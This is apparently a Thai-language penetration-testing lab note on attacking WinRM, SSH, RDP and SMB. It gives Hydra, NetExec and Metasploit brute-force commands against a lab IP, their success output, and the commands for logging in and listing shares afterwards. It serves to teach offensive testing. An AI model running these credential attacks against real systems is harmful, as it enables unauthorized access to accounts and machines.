# บริการเครือข่าย (Network Services)

## บทนำ

ในการทดสอบเจาะระบบ เราจะพบบริการต่างๆ ที่ติดตั้งไว้เพื่อจัดการ แก้ไข หรือสร้างเนื้อหา บริการเหล่านี้ทำงานด้วยสิทธิ์เฉพาะและถูกกำหนดให้กับผู้ใช้เฉพาะ นอกจากเว็บแอปพลิเคชันแล้ว ยังมีบริการอื่นๆ เช่น:

- **FTP, SMB, NFS** - การแชร์ไฟล์
- **IMAP/POP3, SMTP** - อีเมล
- **SSH, RDP, WinRM, VNC, Telnet** - การเข้าถึงระยะไกล
- **MySQL/MSSQL** - ฐานข้อมูล
- **LDAP** - ไดเรกทอรี

---

## WinRM (Windows Remote Management)

### คำอธิบาย
WinRM คือการ implement ของ Microsoft สำหรับ Web Services Management Protocol (WS-Management) เป็น network protocol ที่ใช้ XML web services และ SOAP สำหรับการจัดการระบบ Windows จากระยะไกล

### คุณสมบัติสำคัญ
- จัดการการสื่อสารระหว่าง WBEM และ WMI
- สามารถเรียก DCOM ได้
- **ต้องเปิดใช้งานและตั้งค่าด้วยตนเอง** ใน Windows 10/11

### พอร์ตที่ใช้
- **TCP 5985** - HTTP
- **TCP 5986** - HTTPS

### NetExec - เครื่องมือโจมตี Password

**การติดตั้ง:**
```bash
sudo apt-get -y install netexec
```

**รูปแบบการใช้งาน:**
```bash
netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

**ตัวอย่างโจมตี WinRM:**
```bash
netexec winrm 10.129.42.197 -u user.list -p password.list
```

**ผลลัพธ์:**
```
WINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197)
WINRM       10.129.42.197   5985   NONE             [*] http://10.129.42.197:5985/wsman
WINRM       10.129.42.197   5985   NONE             [+] None\user:password (Pwn3d!)
```

**หมายเหตุ:** `(Pwn3d!)` หมายถึง สามารถ execute system commands ได้

### Evil-WinRM

**การติดตั้ง:**
```bash
sudo gem install evil-winrm
```

**การใช้งาน:**
```bash
evil-winrm -i <target-IP> -u <username> -p <password>
```

**ตัวอย่าง:**
```bash
evil-winrm -i 10.129.42.197 -u user -p password
```

เมื่อเข้าสู่ระบบสำเร็จ จะได้ terminal session ผ่าน **Powershell Remoting Protocol (MS-PSRP)**

---

## SSH (Secure Shell)

### คำอธิบาย
SSH เป็นวิธีที่ปลอดภัยในการเชื่อมต่อกับ remote host เพื่อรันคำสั่งหรือถ่ายโอนไฟล์

### คุณสมบัติ
- พอร์ตเริ่มต้น: **TCP 22**
- ใช้การเข้ารหัส 3 แบบ:

#### 1. **Symmetric Encryption (การเข้ารหัสสมมาตร)**
- ใช้ key เดียวกันทั้งเข้ารหัสและถอดรหัส
- ใช้ **Diffie-Hellman key exchange** เพื่อแลกเปลี่ยน key อย่างปลอดภัย
- ตัวอย่าง cipher: AES, Blowfish, 3DES

#### 2. **Asymmetric Encryption (การเข้ารหัสอสมมาตร)**
- ใช้ 2 keys: **Private Key** และ **Public Key**
- Private key ต้องเก็บเป็นความลับ (ใช้ถอดรหัส)
- Public key ใช้เข้ารหัส
- ถ้า attacker ได้ private key = สามารถเข้าระบบได้โดยไม่ต้องมี credentials

#### 3. **Hashing**
- แปลงข้อมูลเป็นค่าที่ไม่ซ้ำ (unique value)
- ใช้ยืนยันความถูกต้องของข้อความ
- ทำงานทิศทางเดียว (one-way)

### การโจมตีด้วย Hydra

```bash
hydra -L user.list -P password.list ssh://10.129.42.197
```

**ผลลัพธ์:**
```
[22][ssh] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
```

### การเข้าสู่ระบบผ่าน SSH

```bash
ssh user@10.129.42.197
```

---

## RDP (Remote Desktop Protocol)

### คำอธิบาย
RDP เป็น network protocol ของ Microsoft ที่ให้สิทธิ์การเข้าถึง Windows systems จากระยะไกล

### คุณสมบัติ
- พอร์ตเริ่มต้น: **TCP 3389**
- รองรับการแชร์: รูปภาพ, เสียง, keyboard, เมาส์
- สามารถพิมพ์เอกสารและเข้าถึง storage จาก client

### ส่วนประกอบ
1. **Terminal Server** - เครื่องที่ทำงานจริง
2. **Terminal Client** - เครื่องที่ควบคุมจากระยะไกล

### การโจมตีด้วย Hydra

```bash
hydra -L user.list -P password.list rdp://10.129.42.197
```

**คำเตือน:** 
- ควรใช้ `-t 1` หรือ `-t 4` เพื่อลดจำนวน parallel connections
- ควรใช้ `-W 1` หรือ `-W 3` เพื่อรอระหว่างการเชื่อมต่อ

**ผลลัพธ์:**
```
[3389][rdp] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
```

### การเข้าสู่ระบบด้วย xFreeRDP

```bash
xfreerdp /v:<target-IP> /u:<username> /p:<password> /dynamic-resolution

```

**ตัวอย่าง:**
```bash
xfreerdp /v:10.129.42.197 /u:user /p:password
```

---

## SMB (Server Message Block)

### คำอธิบาย
SMB เป็น protocol สำหรับถ่ายโอนข้อมูลระหว่าง client และ server ในเครือข่ายท้องถิ่น ใช้สำหรับแชร์ไฟล์ ไดเรกทอรี และบริการพิมพ์

### ชื่ออื่นๆ
- **CIFS** (Common Internet File System)
- **Samba** (open-source implementation สำหรับ Linux)

### คุณสมบัติ
- พอร์ตเริ่มต้น: **TCP 445**
- เทียบเท่า NFS ใน Unix/Linux
- รองรับหลายแพลตฟอร์ม: Windows, Linux, macOS

### การโจมตีด้วย Hydra

```bash
hydra -L user.list -P password.list smb://10.129.42.197
```

**ผลลัพธ์:**
```
[445][smb] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid passwords found
```

### แก้ปัญหา Error (SMBv3)

ถ้าเจอ error: `invalid reply from target` แสดงว่า Hydra รุ่นเก่าไม่รองรับ SMBv3

**วิธีแก้:** ใช้ **Metasploit Framework**

```bash
msfconsole -q

msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > set user_file user.list
msf6 auxiliary(scanner/smb/smb_login) > set pass_file password.list
msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.42.197
msf6 auxiliary(scanner/smb/smb_login) > run
```

**ผลลัพธ์:**
```
[+] 10.129.42.197:445 - Success: '.\user:password'
```

### การตรวจสอบ Shares ด้วย NetExec

```bash
netexec smb 10.129.42.197 -u "user" -p "password" --shares
```

**ผลลัพธ์:**
```
SMB    10.129.42.197   445    WINSRV    [+] Enumerated shares
SMB    10.129.42.197   445    WINSRV    Share           Permissions     Remark
SMB    10.129.42.197   445    WINSRV    ADMIN$                          Remote Admin
SMB    10.129.42.197   445    WINSRV    C$                              Default share
SMB    10.129.42.197   445    WINSRV    SHARENAME       READ,WRITE      
SMB    10.129.42.197   445    WINSRV    IPC$            READ            Remote IPC
```

### การเข้าถึง Share ด้วย Smbclient

```bash
smbclient -U user \\\\10.129.42.197\\SHARENAME
```

